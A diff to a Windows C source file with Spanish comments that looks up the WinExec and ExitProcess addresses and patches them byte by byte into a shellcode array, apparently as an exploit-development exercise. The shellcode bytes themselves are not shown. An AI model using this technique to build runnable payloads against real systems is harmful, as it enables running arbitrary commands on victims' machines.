@@ -8,7 +8,6 @@
  */
 
 #include <windows.h>
-//#include "shellcode.h"
 
 void getaddr(unsigned long *winexec_addr, unsigned long *exitprocess_addr)
 /*
@@ -31,9 +30,10 @@ void getaddr(unsigned long *winexec_addr, unsigned long *exitprocess_addr)
 	*exitprocess_addr = GetProcAddress(kernel32_addr, "ExitProcess"); 
 	*winexec_addr 	  = GetProcAddress(kernel32_addr, "WinExec"); 
 }
-void assign_addr(unsigned char shellcode[])
+void assign_addr(unsigned char shellcode[], unsigned long *winexec_addr, unsigned long *exitprocess_addr)
 /*
 	Recibe como parámetro el arreglo de la shellcode.  
+	Y los valores obtenidos anteriormente  de las direcciones de las funciones 
  */
 {
 	/* 
@@ -54,13 +54,13 @@ void assign_addr(unsigned char shellcode[])
 
 			Y nos quedaría algo como : 0xFF7754AF.
 	 */
-	shellcode[18+1] = (winexec_addr & 0x000000FF); 
-	shellcode[18+2] = (winexec_addr & 0x0000FF00) >> 8;
-	shellcode[18+3] = (winexec_addr & 0x00FF0000) >> 16;
-	shellcode[18+4] = (winexec_addr & 0xFF000000) >> 24; 
+	shellcode[18+1] = (*winexec_addr & 0x000000FF); 
+	shellcode[18+2] = (*winexec_addr & 0x0000FF00) >> 8;
+	shellcode[18+3] = (*winexec_addr & 0x00FF0000) >> 16;
+	shellcode[18+4] = (*winexec_addr & 0xFF000000) >> 24; 
 
-	shellcode[28+1] = (exitprocess_addr & 0x000000FF); 
-	shellcode[28+2] = (exitprocess_addr & 0x0000FF00) >> 8;
-	shellcode[28+3] = (exitprocess_addr & 0x00FF0000) >> 16;
-	shellcode[28+4] = (exitprocess_addr & 0xFF000000) >> 24; 
+	shellcode[28+1] = (*exitprocess_addr & 0x000000FF); 
+	shellcode[28+2] = (*exitprocess_addr & 0x0000FF00) >> 8;
+	shellcode[28+3] = (*exitprocess_addr & 0x00FF0000) >> 16;
+	shellcode[28+4] = (*exitprocess_addr & 0xFF000000) >> 24; 
 }
